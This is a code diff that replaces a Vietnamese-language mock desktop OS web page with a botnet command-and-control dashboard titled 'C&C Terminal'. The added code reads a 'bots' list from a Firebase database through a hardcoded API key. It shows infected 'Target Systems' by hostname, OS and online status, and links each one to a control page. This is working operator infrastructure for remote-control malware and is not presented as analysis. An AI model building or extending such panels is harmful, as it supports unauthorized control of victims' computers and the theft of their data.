@@ -3,459 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ Điều Hành Giả Lập</title>
-    <link rel="stylesheet" href="styles.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>C&C Terminal</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
+        body {
+            background-color: #0a0a0a;
+            color: #00ff41;
+            font-family: 'VT323', monospace;
+            font-size: 1.2rem;
+            text-shadow: 0 0 5px #00ff41;
+            margin: 0;
+            padding: 20px;
+            background-image:
+                repeating-linear-gradient(
+                    #0a0a0a 0px, #0a0a0a 1px,
+                    transparent 1px, transparent 2px
+                );
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: rgba(10, 20, 10, 0.1);
+            border: 1px solid #00ff41;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            color: #00ff41;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            animation: blink-caret .75s step-end infinite;
+        }
+        #bot-list {
+            list-style-type: none;
+            padding: 0;
+        }
+        .bot-item {
+            background: transparent;
+            margin: 10px 0;
+            padding: 15px;
+            border-bottom: 1px dashed #004d14;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background-color 0.3s;
+        }
+        .bot-item:hover {
+            background-color: rgba(0, 255, 65, 0.1);
+        }
+        .bot-item a {
+            text-decoration: none;
+            color: #00ff41;
+            font-weight: bold;
+            font-size: 1.5rem;
+        }
+        .bot-info {
+            font-size: 1rem;
+            color: #00b32e;
+        }
+        .status-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .status-text {
+            font-size: 1rem;
+        }
+        .status-text.online {
+            color: #00ff41;
+        }
+        .status-text.offline {
+            color: #888;
+        }
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            animation: blink-indicator 1.5s infinite;
+        }
+        .status-indicator.online {
+            background-color: #00ff41;
+            box-shadow: 0 0 10px #00ff41;
+        }
+        .status-indicator.offline {
+            background-color: #444;
+            animation: none;
+        }
+        @keyframes blink-caret {
+            from, to { border-right: 2px solid #00ff41; }
+            50% { border-right-color: transparent; }
+        }
+        @keyframes blink-indicator {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
 </head>
 <body>
-    <div class="os-container">
-        <!-- Màn hình khóa -->
-        <div class="lock-screen" id="lockScreen">
-            <div class="lock-screen-time" id="lockScreenTime">00:00</div>
-            <div class="lock-screen-date" id="lockScreenDate">Thứ Hai, 1 tháng 1</div>
-            <div class="lock-screen-instruction">Nhấn phím bất kỳ để mở khóa</div>
-        </div>
-
-        <!-- Màn hình đăng nhập -->
-        <div class="login-screen" id="loginScreen">
-            <div class="user-avatar">
-                <img src="https://i.pravatar.cc/150?img=12" alt="User Avatar">
-            </div>
-            <div class="user-name">Người Dùng</div>
-            <div class="password-input">
-                <input type="password" id="passwordInput" placeholder="Mật khẩu">
-                <button id="loginButton">Đăng nhập</button>
-            </div>
-        </div>
-
-        <!-- Màn hình desktop -->
-        <div class="desktop" id="desktop">
-            <!-- Thanh taskbar -->
-            <div class="taskbar">
-                <div class="start-menu-button" id="startMenuButton">
-                    <i class="fa-solid fa-window"></i>
-                </div>
-                <div class="taskbar-apps" id="taskbarApps">
-                    <!-- Các ứng dụng đang mở sẽ hiển thị ở đây -->
-                </div>
-                <div class="taskbar-right">
-                    <div class="taskbar-time" id="taskbarTime">00:00</div>
-                    <div class="taskbar-icons">
-                        <i class="fa-solid fa-wifi"></i>
-                        <i class="fa-solid fa-volume-high"></i>
-                        <i class="fa-solid fa-battery-full"></i>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Start Menu -->
-            <div class="start-menu" id="startMenu">
-                <div class="start-menu-header">
-                    <div class="user-info">
-                        <img src="https://i.pravatar.cc/150?img=12" alt="User Avatar" class="user-avatar-small">
-                        <span>Người Dùng</span>
-                    </div>
-                    <div class="power-options">
-                        <i class="fa-solid fa-power-off" id="powerButton"></i>
-                        <i class="fa-solid fa-arrow-right-from-bracket" id="logoutButton"></i>
-                    </div>
-                </div>
-                <div class="start-menu-apps">
-                    <div class="app-item" data-app="fileExplorer">
-                        <i class="fa-solid fa-folder"></i>
-                        <span>File Explorer</span>
-                    </div>
-                    <div class="app-item" data-app="browser">
-                        <i class="fa-solid fa-globe"></i>
-                        <span>Trình duyệt</span>
-                    </div>
-                    <div class="app-item" data-app="notepad">
-                        <i class="fa-solid fa-note-sticky"></i>
-                        <span>Notepad</span>
-                    </div>
-                    <div class="app-item" data-app="calculator">
-                        <i class="fa-solid fa-calculator"></i>
-                        <span>Máy tính</span>
-                    </div>
-                    <div class="app-item" data-app="settings">
-                        <i class="fa-solid fa-gear"></i>
-                        <span>Cài đặt</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Desktop Icons -->
-            <div class="desktop-icons">
-                <div class="desktop-icon" data-app="fileExplorer">
-                    <i class="fa-solid fa-folder fa-2x"></i>
-                    <span>File Explorer</span>
-                </div>
-                <div class="desktop-icon" data-app="browser">
-                    <i class="fa-solid fa-globe fa-2x"></i>
-                    <span>Trình duyệt</span>
-                </div>
-                <div class="desktop-icon" data-app="notepad">
-                    <i class="fa-solid fa-note-sticky fa-2x"></i>
-                    <span>Notepad</span>
-                </div>
-                <div class="desktop-icon" data-app="calculator">
-                    <i class="fa-solid fa-calculator fa-2x"></i>
-                    <span>Máy tính</span>
-                </div>
-                <div class="desktop-icon" data-app="recycle">
-                    <i class="fa-solid fa-trash fa-2x"></i>
-                    <span>Thùng rác</span>
-                </div>
-            </div>
-
-            <!-- App Windows -->
-            <div class="app-windows" id="appWindows">
-                <!-- File Explorer -->
-                <div class="app-window" id="fileExplorer">
-                    <div class="window-header">
-                        <div class="window-title">
-                            <i class="fa-solid fa-folder"></i>
-                            <span>File Explorer</span>
-                        </div>
-                        <div class="window-controls">
-                            <span class="window-minimize"><i class="fa-solid fa-window-minimize"></i></span>
-                            <span class="window-maximize"><i class="fa-solid fa-window-maximize"></i></span>
-                            <span class="window-close"><i class="fa-solid fa-xmark"></i></span>
-                        </div>
-                    </div>
-                    <div class="window-toolbar">
-                        <button><i class="fa-solid fa-arrow-left"></i></button>
-                        <button><i class="fa-solid fa-arrow-right"></i></button>
-                        <button><i class="fa-solid fa-arrow-up"></i></button>
-                        <div class="address-bar">C:\Users\Người Dùng\Documents</div>
-                        <button><i class="fa-solid fa-magnifying-glass"></i></button>
-                    </div>
-                    <div class="window-sidebar">
-                        <div class="sidebar-item"><i class="fa-solid fa-desktop"></i> Desktop</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-download"></i> Downloads</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-file"></i> Documents</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-image"></i> Pictures</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-music"></i> Music</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-video"></i> Videos</div>
-                    </div>
-                    <div class="window-content">
-                        <div class="file-item"><i class="fa-solid fa-file-word"></i> Document1.docx</div>
-                        <div class="file-item"><i class="fa-solid fa-file-excel"></i> Spreadsheet1.xlsx</div>
-                        <div class="file-item"><i class="fa-solid fa-file-powerpoint"></i> Presentation1.pptx</div>
-                        <div class="file-item"><i class="fa-solid fa-file-pdf"></i> Document.pdf</div>
-                        <div class="file-item"><i class="fa-solid fa-file-image"></i> Image.jpg</div>
-                        <div class="file-item"><i class="fa-solid fa-folder"></i> Project</div>
-                        <div class="file-item"><i class="fa-solid fa-folder"></i> Personal</div>
-                        <div class="file-item"><i class="fa-solid fa-folder"></i> Work</div>
-                    </div>
-                    <div class="window-statusbar">
-                        <span>8 items</span>
-                        <span>4.2 GB free of 256 GB</span>
-                    </div>
-                </div>
-
-                <!-- Browser -->
-                <div class="app-window" id="browser">
-                    <div class="window-header">
-                        <div class="window-title">
-                            <i class="fa-solid fa-globe"></i>
-                            <span>Trình duyệt</span>
-                        </div>
-                        <div class="window-controls">
-                            <span class="window-minimize"><i class="fa-solid fa-window-minimize"></i></span>
-                            <span class="window-maximize"><i class="fa-solid fa-window-maximize"></i></span>
-                            <span class="window-close"><i class="fa-solid fa-xmark"></i></span>
-                        </div>
-                    </div>
-                    <div class="window-toolbar browser-toolbar">
-                        <button><i class="fa-solid fa-arrow-left"></i></button>
-                        <button><i class="fa-solid fa-arrow-right"></i></button>
-                        <button><i class="fa-solid fa-rotate-right"></i></button>
-                        <div class="address-bar">https://www.example.com</div>
-                        <button><i class="fa-solid fa-star"></i></button>
-                    </div>
-                    <div class="window-content browser-content">
-                        <div class="browser-page">
-                            <h1>Chào mừng đến với trang web mẫu</h1>
-                            <p>Đây là một trang web mẫu trong trình duyệt giả lập của bạn.</p>
-                            <div class="browser-search">
-                                <input type="text" placeholder="Tìm kiếm...">
-                                <button><i class="fa-solid fa-magnifying-glass"></i></button>
-                            </div>
-                            <div class="browser-links">
-                                <div class="browser-link-item">
-                                    <i class="fa-solid fa-newspaper"></i>
-                                    <span>Tin tức</span>
-                                </div>
-                                <div class="browser-link-item">
-                                    <i class="fa-solid fa-envelope"></i>
-                                    <span>Email</span>
-                                </div>
-                                <div class="browser-link-item">
-                                    <i class="fa-solid fa-cloud"></i>
-                                    <span>Thời tiết</span>
-                                </div>
-                                <div class="browser-link-item">
-                                    <i class="fa-solid fa-map"></i>
-                                    <span>Bản đồ</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Notepad -->
-                <div class="app-window" id="notepad">
-                    <div class="window-header">
-                        <div class="window-title">
-                            <i class="fa-solid fa-note-sticky"></i>
-                            <span>Notepad</span>
-                        </div>
-                        <div class="window-controls">
-                            <span class="window-minimize"><i class="fa-solid fa-window-minimize"></i></span>
-                            <span class="window-maximize"><i class="fa-solid fa-window-maximize"></i></span>
-                            <span class="window-close"><i class="fa-solid fa-xmark"></i></span>
-                        </div>
-                    </div>
-                    <div class="window-toolbar notepad-toolbar">
-                        <div class="dropdown">
-                            <span>File</span>
-                            <div class="dropdown-content">
-                                <div>Mới</div>
-                                <div>Mở</div>
-                                <div>Lưu</div>
-                                <div>Lưu như</div>
-                                <div>Thoát</div>
-                            </div>
-                        </div>
-                        <div class="dropdown">
-                            <span>Chỉnh sửa</span>
-                            <div class="dropdown-content">
-                                <div>Cắt</div>
-                                <div>Sao chép</div>
-                                <div>Dán</div>
-                                <div>Chọn tất cả</div>
-                            </div>
-                        </div>
-                        <div class="dropdown">
-                            <span>Định dạng</span>
-                            <div class="dropdown-content">
-                                <div>Font</div>
-                                <div>Màu sắc</div>
-                            </div>
-                        </div>
-                        <div class="dropdown">
-                            <span>Xem</span>
-                            <div class="dropdown-content">
-                                <div>Zoom</div>
-                                <div>Thanh trạng thái</div>
-                            </div>
-                        </div>
-                        <div class="dropdown">
-                            <span>Trợ giúp</span>
-                            <div class="dropdown-content">
-                                <div>Xem trợ giúp</div>
-                                <div>Về Notepad</div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="window-content notepad-content">
-                        <textarea placeholder="Nhập văn bản ở đây..."></textarea>
-                    </div>
-                    <div class="window-statusbar">
-                        <span>UTF-8</span>
-                        <span>Dòng 1, Cột 1</span>
-                    </div>
-                </div>
-
-                <!-- Calculator -->
-                <div class="app-window" id="calculator">
-                    <div class="window-header">
-                        <div class="window-title">
-                            <i class="fa-solid fa-calculator"></i>
-                            <span>Máy tính</span>
-                        </div>
-                        <div class="window-controls">
-                            <span class="window-minimize"><i class="fa-solid fa-window-minimize"></i></span>
-                            <span class="window-maximize"><i class="fa-solid fa-window-maximize"></i></span>
-                            <span class="window-close"><i class="fa-solid fa-xmark"></i></span>
-                        </div>
-                    </div>
-                    <div class="calculator-display">
-                        <div class="calc-history">0</div>
-                        <div class="calc-result">0</div>
-                    </div>
-                    <div class="calculator-buttons">
-                        <button class="calc-btn calc-btn-special">%</button>
-                        <button class="calc-btn calc-btn-special">CE</button>
-                        <button class="calc-btn calc-btn-special">C</button>
-                        <button class="calc-btn calc-btn-special"><i class="fa-solid fa-delete-left"></i></button>
-                        
-                        <button class="calc-btn calc-btn-special">1/x</button>
-                        <button class="calc-btn calc-btn-special">x²</button>
-                        <button class="calc-btn calc-btn-special">√x</button>
-                        <button class="calc-btn calc-btn-operator">÷</button>
-                        
-                        <button class="calc-btn">7</button>
-                        <button class="calc-btn">8</button>
-                        <button class="calc-btn">9</button>
-                        <button class="calc-btn calc-btn-operator">×</button>
-                        
-                        <button class="calc-btn">4</button>
-                        <button class="calc-btn">5</button>
-                        <button class="calc-btn">6</button>
-                        <button class="calc-btn calc-btn-operator">-</button>
-                        
-                        <button class="calc-btn">1</button>
-                        <button class="calc-btn">2</button>
-                        <button class="calc-btn">3</button>
-                        <button class="calc-btn calc-btn-operator">+</button>
-                        
-                        <button class="calc-btn calc-btn-special">±</button>
-                        <button class="calc-btn">0</button>
-                        <button class="calc-btn">.</button>
-                        <button class="calc-btn calc-btn-equals">=</button>
-                    </div>
-                </div>
-
-                <!-- Settings -->
-                <div class="app-window" id="settings">
-                    <div class="window-header">
-                        <div class="window-title">
-                            <i class="fa-solid fa-gear"></i>
-                            <span>Cài đặt</span>
-                        </div>
-                        <div class="window-controls">
-                            <span class="window-minimize"><i class="fa-solid fa-window-minimize"></i></span>
-                            <span class="window-maximize"><i class="fa-solid fa-window-maximize"></i></span>
-                            <span class="window-close"><i class="fa-solid fa-xmark"></i></span>
-                        </div>
-                    </div>
-                    <div class="window-sidebar settings-sidebar">
-                        <div class="sidebar-item active"><i class="fa-solid fa-palette"></i> Cá nhân hóa</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-wifi"></i> Mạng & Internet</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-volume-high"></i> Âm thanh</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-bell"></i> Thông báo</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-lock"></i> Bảo mật</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-clock"></i> Thời gian & Ngôn ngữ</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-gamepad"></i> Trò chơi</div>
-                        <div class="sidebar-item"><i class="fa-solid fa-info-circle"></i> Về hệ thống</div>
-                    </div>
-                    <div class="window-content settings-content">
-                        <h2>Cá nhân hóa</h2>
-                        <div class="settings-section">
-                            <h3>Nền</h3>
-                            <div class="settings-option">
-                                <span>Chọn hình nền:</span>
-                                <select id="wallpaperSelect">
-                                    <option value="default">Mặc định</option>
-                                    <option value="mountains">Núi</option>
-                                    <option value="ocean">Đại dương</option>
-                                    <option value="forest">Rừng</option>
-                                </select>
-                            </div>
-                        </div>
-                        <div class="settings-section">
-                            <h3>Màu sắc</h3>
-                            <div class="settings-option">
-                                <span>Màu chủ đạo:</span>
-                                <div class="color-options">
-                                    <div class="color-option" style="background-color: #0078d7;"></div>
-                                    <div class="color-option" style="background-color: #e81123;"></div>
-                                    <div class="color-option" style="background-color: #107c10;"></div>
-                                    <div class="color-option" style="background-color: #ff8c00;"></div>
-                                    <div class="color-option" style="background-color: #8e44ad;"></div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="settings-section">
-                            <h3>Chế độ</h3>
-                            <div class="settings-option">
-                                <span>Chế độ hiển thị:</span>
-                                <div class="toggle-option">
-                                    <span>Sáng</span>
-                                    <label class="switch">
-                                        <input type="checkbox" id="themeToggle">
-                                        <span class="slider round"></span>
-                                    </label>
-                                    <span>Tối</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Context Menu -->
-            <div class="context-menu" id="contextMenu">
-                <div class="context-menu-item"><i class="fa-solid fa-eye"></i> Xem</div>
-                <div class="context-menu-item"><i class="fa-solid fa-folder-plus"></i> Tạo thư mục mới</div>
-                <div class="context-menu-item"><i class="fa-solid fa-file"></i> Tạo tập tin mới</div>
-                <div class="context-menu-separator"></div>
-                <div class="context-menu-item"><i class="fa-solid fa-paste"></i> Dán</div>
-                <div class="context-menu-separator"></div>
-                <div class="context-menu-item"><i class="fa-solid fa-display"></i> Cài đặt hiển thị</div>
-                <div class="context-menu-item"><i class="fa-solid fa-gear"></i> Cài đặt cá nhân</div>
-            </div>
-
-            <!-- Notifications -->
-            <div class="notification-center" id="notificationCenter">
-                <div class="notification-header">
-                    <h3>Thông báo</h3>
-                    <button id="clearNotifications">Xóa tất cả</button>
-                </div>
-                <div class="notification-list">
-                    <div class="notification-item">
-                        <div class="notification-icon"><i class="fa-solid fa-bell"></i></div>
-                        <div class="notification-content">
-                            <div class="notification-title">Cập nhật hệ thống</div>
-                            <div class="notification-message">Có bản cập nhật mới cho hệ thống của bạn.</div>
-                            <div class="notification-time">2 phút trước</div>
-                        </div>
-                    </div>
-                    <div class="notification-item">
-                        <div class="notification-icon"><i class="fa-solid fa-envelope"></i></div>
-                        <div class="notification-content">
-                            <div class="notification-title">Email mới</div>
-                            <div class="notification-message">Bạn có một email mới từ admin@example.com</div>
-                            <div class="notification-time">15 phút trước</div>
-                        </div>
-                    </div>
-                    <div class="notification-item">
-                        <div class="notification-icon"><i class="fa-solid fa-calendar"></i></div>
-                        <div class="notification-content">
-                            <div class="notification-title">Nhắc nhở lịch</div>
-                            <div class="notification-message">Cuộc họp sắp bắt đầu trong 30 phút.</div>
-                            <div class="notification-time">28 phút trước</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Power Dialog -->
-        <div class="power-dialog" id="powerDialog">
-            <div class="power-dialog-content">
-                <div class="power-option" id="shutdownOption">
-                    <i class="fa-solid fa-power-off"></i>
-                    <span>Tắt máy</span>
-                </div>
-                <div class="power-option" id="restartOption">
-                    <i class="fa-solid fa-rotate"></i>
-                    <span>Khởi động lại</span>
-                </div>
-                <div class="power-option" id="sleepOption">
-                    <i class="fa-solid fa-moon"></i>
-                    <span>Ngủ</span>
-                </div>
-                <div class="power-option" id="cancelPowerOption">
-                    <i class="fa-solid fa-xmark"></i>
-                    <span>Hủy</span>
-                </div>
-            </div>
-        </div>
+    <div class="container">
+        <h1>[ Target Systems ]</h1>
+        <ul id="bot-list">
+            <li>INITIALIZING CONNECTION TO C&C...</li>
+        </ul>
     </div>
 
-    <script src="script.js"></script>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+
+        const firebaseConfig = {
+          apiKey: "AIzaSyDmzm6X2MFSmEHc-trurDHlFMk71t47qqk",
+          authDomain: "chat-4e280.firebaseapp.com",
+          databaseURL: "https://chat-4e280-default-rtdb.firebaseio.com/",
+          projectId: "chat-4e280",
+          storageBucket: "chat-4e280.appspot.com",
+          messagingSenderId: "264573039049",
+          appId: "1:264573039049:web:d7cf8d4e61e822d2f6b818",
+          measurementId: "G-BGY9LNDF1K"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        const botsRef = ref(database, 'bots');
+        onValue(botsRef, (snapshot) => {
+            const bots = snapshot.val();
+            const botListEl = document.getElementById('bot-list');
+            botListEl.innerHTML = '';
+
+            if (!bots) {
+                botListEl.innerHTML = '<li>NO TARGETS DETECTED. AWAITING CONNECTIONS...</li>';
+                return;
+            }
+
+            // 1. Chuyển đổi object thành array và tính toán trạng thái
+            const botArray = Object.keys(bots).map(botId => {
+                const bot = bots[botId];
+                const info = bot.info || {};
+                const lastSeen = info.last_seen || 0;
+                const isOnline = (Date.now() / 1000 - lastSeen) < 30; // Online nếu thấy trong 30 giây
+                return {
+                    id: botId,
+                    info: info,
+                    isOnline: isOnline
+                };
+            });
+
+            // 2. Sắp xếp: online lên trên, offline xuống dưới
+            botArray.sort((a, b) => {
+                // Chuyển boolean thành số (true=1, false=0) để so sánh
+                // b - a sẽ cho kết quả là 1, -1, hoặc 0, đẩy các mục 'true' lên đầu
+                return b.isOnline - a.isOnline;
+            });
+
+            // 3. Hiển thị danh sách đã sắp xếp
+            botArray.forEach(bot => {
+                const li = document.createElement('li');
+                li.className = 'bot-item';
+
+                const statusClass = bot.isOnline ? 'online' : 'offline';
+                const statusText = bot.isOnline ? 'ONLINE' : 'OFFLINE';
+
+                li.innerHTML = `
+                    <div>
+                        <a href="control.html?bot_id=${bot.id}">${bot.info.hostname || 'UNKNOWN_HOST'}</a>
+                        <div class="bot-info">ID: ${bot.id} // OS: ${bot.info.os || 'N/A'}</div>
+                    </div>
+                    <div class="status-container">
+                        <span class="status-text ${statusClass}">${statusText}</span>
+                        <div class="status-indicator ${statusClass}"></div>
+                    </div>
+                `;
+                botListEl.appendChild(li);
+            });
+        });
+    </script>
 </body>
 </html>
